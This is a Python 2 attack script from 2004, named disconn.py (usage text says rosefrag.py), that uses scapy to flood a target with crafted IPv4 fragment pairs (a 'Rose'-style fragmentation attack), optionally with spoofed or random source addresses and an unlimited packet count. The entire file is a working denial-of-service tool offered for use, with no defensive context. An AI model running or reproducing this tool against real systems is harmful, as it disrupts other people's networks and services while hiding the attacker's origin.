#!/usr/bin/python
#
# Version: 1.0
# Copyright 2004 r3d5un
#
# disconn.py is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# disconn.py is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with disconn.py; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
#
# 27.04.2004 Update: fixed a Problem with Random Addresses
#		     fixed a Problem with the ID
#


import scapy
import sys
import random
import string

def cmdParser(args):
        pos = 1
        quiet = 0
        count = 1000
        running = True
        while running:
                running = False
                if args[pos] == "-c":
                        try:
                                count = long(args[pos+1])
                                pos = pos + 2
                                running = True
                        except:
                                pos = pos + 1

                elif args[pos] == "-q":
                        quiet = 1
                        running = True
                        pos = pos + 1
		elif args[pos] == "-v":
			quiet = -1
			running = True
			pos = pos + 1 
        dstip = args[pos]
        srcip = args[pos+1]


        return dstip,srcip,count,quiet


def genRandIP():
	return str(random.randint(11,126))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))

def roseit(dstip,srcip,count,quiet):        
        if quiet < 1:
                print "Attacking " + dstip + " <--> " + srcip

	ip1  =  scapy.IP(dst=dstip,src=srcip,ttl=255,flags=4,frag=1,proto=0x6)
	ip2  =  scapy.IP(dst=dstip,src=srcip,ttl=255,flags=0,frag=16330,proto=0x6)
	i = 0
        k = 0
	id = 0
	tip = srcip
	if count == 0:
		incr = 0
	else:
		incr = 1

        while i <= count:
		ip1.id=int(id)
		ip2.id=int(id)
		
		if srcip=="0.0.0.0":
			tip = genRandIP()
			ip1.src = tip
			ip2.src = tip
		if quiet < 0:			
			print str(dstip)+" <-- "+str(tip)  

		scapy.send(ip1/scapy.TCP())	
		scapy.send(ip2/scapy.TCP())	
	        k=(k+1)%100
	        if k == 0:
	              if quiet < 1:
	                     print "100 Packets sent (packets="+str(i)+")"
                i = i + incr
		id = (id + 1)%65534

try:
	args = sys.argv
	dstip,srcip,count,quiet = cmdParser(args)
except:
	print "Usage: rosefrag.py [-q] [-v] [-c <count>] <dst.ip> <src.ip>\n"
roseit(dstip,srcip,count,quiet)
